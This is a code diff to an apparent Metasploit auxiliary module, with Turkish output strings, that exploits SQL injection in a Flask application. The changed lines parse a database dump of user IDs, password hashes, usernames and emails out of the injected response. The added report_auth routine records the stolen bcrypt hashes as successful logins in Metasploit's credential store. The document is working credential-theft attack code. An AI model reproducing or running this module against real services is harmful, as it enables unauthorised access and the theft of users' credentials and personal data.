@@ -86,13 +86,14 @@ class MetasploitModule < Msf::Auxiliary
       sonuclar = res.body.match(/qkkkq(.*)nszrqy(.*)nszrqy(.*)nszrqy(.*)qbpbq/)
       id = sonuclar[1]
       password = sonuclar[2]
-      username = sonuclar[3]
-      email = sonuclar[4]
+      username = sonuclar[4]
+      email = sonuclar[3]
       print_good(" Veriler elde edildi")
       print_warning("User ID : #{id}")
       print_warning("Password : #{password}")
       print_warning("Username : #{username}")
       print_warning("Email: #{email}")
+      report_auth(username, password)
 
 =begin
 
@@ -132,5 +133,35 @@ class MetasploitModule < Msf::Auxiliary
     sqli
     print_good(" HER SEY COK GUZEL DEGIL HER SEY PATLIYOR !")
 
+  end
+
+  def report_auth(username, password)
+    service_data = {
+        address: ::Rex::Socket.getaddress(datastore['RHOSTS'],true),
+        port: datastore['RPORT'],
+        service_name: 'flask',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+        origin_type: :service,
+        module_fullname: self.fullname,
+        username: username,
+        private_data: password,
+        private_type: :nonreplayable_hash,
+        jtr_format: 'bcrypt'
+    }
+
+    credential_data.merge!(service_data)
+    credential_core = create_credential(credential_data)
+    login_data = {
+        access_level: 'Unknown',
+        core: credential_core,
+        last_attempted_at: DateTime.now,
+        status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
   end
 end
